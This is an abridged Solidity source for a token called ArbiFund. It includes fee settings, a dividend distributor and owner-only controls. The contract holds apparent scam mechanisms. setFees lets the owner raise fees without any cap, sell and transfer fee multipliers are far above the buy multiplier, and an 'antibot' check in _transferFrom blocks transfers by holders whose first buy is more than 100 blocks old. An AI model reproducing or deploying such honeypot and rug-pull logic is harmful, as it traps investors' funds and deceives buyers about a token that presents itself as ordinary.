...
contract DividendDistributor is IDividendDistributor {
    ...
    ERC20 RWRD = ERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    DEXRouter router;
...
contract ArbiFund is ERC20, Auth {
    using SafeMath for uint256;
    ...
    string constant public name = "ArbiFund";
    string constant public symbol = "ArbiFund";
    ...
    uint256 public operationsFee   = 8;
    uint256 public totalFee        = marketingFee + reflectionFee + operationsFee;
    uint256 public constant feeDenominator  = 100;

    uint256 public sellMultiplier  = 4000;
    uint256 public buyMultiplier  = 1500;
    uint256 public transferMultiplier  = 4000;
    ...
    uint256 public swapThreshold = totalSupply * 5 / 1000;
    bool inSwap;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x10509799d430Aaa2dfFe62B6CefDFF0B4294a2E2;
        operationsFeeReceiver = 0x10509799d430Aaa2dfFe62B6CefDFF0B4294a2E2;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(antibot && (firstbuy[sender] > 0)){
            require( firstbuy[sender] > (block.number - 100), "Bought before contract was launched");
        }
    ...
    function swapBack() internal swapping {
        ...
        (tmpSuccess,) = payable(operationsFeeReceiver).call{value: amountETHOperations, gas: 30000}("");
    ...
    function setFees(uint256 _operationsFee, uint256 _marketingFee, uint256 _reflectionFee) external onlyOwner {
        operationsFee = _operationsFee;
        marketingFee = _marketingFee;
        reflectionFee = _reflectionFee;
        
        totalFee = _operationsFee + _marketingFee + _reflectionFee;
    }


    function setFeeReceivers(address _marketingFeeReceiver, address _operationsFeeReceiver) external authorized {
